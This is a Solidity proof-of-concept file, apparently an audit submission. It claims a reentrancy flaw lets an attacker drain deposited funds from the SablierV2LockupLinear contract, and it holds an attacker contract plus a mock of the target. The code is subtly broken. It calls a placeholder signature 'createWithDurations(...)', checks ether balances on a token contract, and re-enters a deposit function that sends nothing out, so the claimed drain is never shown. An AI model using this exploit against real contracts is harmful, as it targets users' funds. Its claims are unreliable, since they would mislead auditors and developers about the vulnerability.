/* Proof of Concept for Reentrancy Vulnerability
Overview:
This vulnerability allows an attacker to exploit the contract by repeatedly calling a function before the previous execution is completed, enabling them to drain funds from the contract.

Actors:
Attacker: The entity exploiting the reentrancy vulnerability to repeatedly withdraw funds.
Victim: Users of the SablierV2LockupLinear contract who have their funds deposited in the contract.
Protocol: The SablierV2LockupLinear contract, which is vulnerable to reentrancy attacks.   
*/


// SPDX-License-Identifier: BUSL-1.1
pragma solidity >=0.8.22;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol";

contract ReentrancyExploit {
    using SafeERC20 for IERC20;

    IERC20 public token;
    address public lockupContract;
    uint256 public streamId;

    constructor(address _token, address _lockupContract, uint256 _streamId) {
        token = IERC20(_token);
        lockupContract = _lockupContract;
        streamId = _streamId;
    }

    function attack() external {
        // Initiate the attack by calling the vulnerable create function
        lockupContract.call(abi.encodeWithSignature("createWithDurations(...)"));
    }

    receive() external payable {
        if (address(lockupContract).balance >= 1 ether) {
            // Reenter the vulnerable function to drain funds
            lockupContract.call(abi.encodeWithSignature("createWithDurations(...)"));
        }
    }
}


// PoC Contract: Represents the SablierV2LockupLinear contract with the reentrancy vulnerability
contract SablierV2LockupLinear {
    using SafeERC20 for IERC20;

    mapping(uint256 => uint256) public balances;
    uint256 public nextStreamId;

    function createWithDurations(address sender, address recipient, uint256 totalAmount, IERC20 asset) external {
        uint256 streamId = nextStreamId;
        nextStreamId++;

        // Initial state change: store the deposit
        balances[streamId] = totalAmount;

        // Interaction: transfer the deposit amount (vulnerable to reentrancy)
        asset.safeTransferFrom(sender, address(this), totalAmount);

        // Final state change: emit an event
        emit StreamCreated(streamId, sender, recipient, totalAmount);
    }

    event StreamCreated(uint256 indexed streamId, address indexed sender, address indexed recipient, uint256 totalAmount);
}
